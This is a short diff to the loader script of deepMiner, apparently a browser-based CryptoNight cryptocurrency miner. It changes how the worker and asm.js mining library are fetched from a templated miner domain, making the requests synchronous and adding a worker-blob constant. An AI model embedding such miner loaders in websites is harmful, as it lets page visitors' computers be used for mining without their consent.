@@ -211,13 +211,13 @@
             this._asmjsStatus = "loaded";
             callback()
         }.bind(this), xhr);
-        xhr.open("get", "https://%deepMiner_domain%/worker.js", true);
+        xhr.open("get", "https://%deepMiner_domain%/worker.min.js", false);
         xhr.send()
         if (this._useWASM || this._asmjsStatus === "loaded") {
             callback()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
-            xhr.open("get", deepMiner.CONFIG.LIB_URL + deepMiner.CONFIG.ASMJS_NAME, true);
+            xhr.open("get", deepMiner.CONFIG.LIB_URL + deepMiner.CONFIG.ASMJS_NAME, false);
             xhr.send()
         }
     };
@@ -579,3 +579,4 @@ self.deepMiner.CONFIG = {
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
+deepMiner.CRYPTONIGHT_WORKER_BLOB = "worker.min.js"
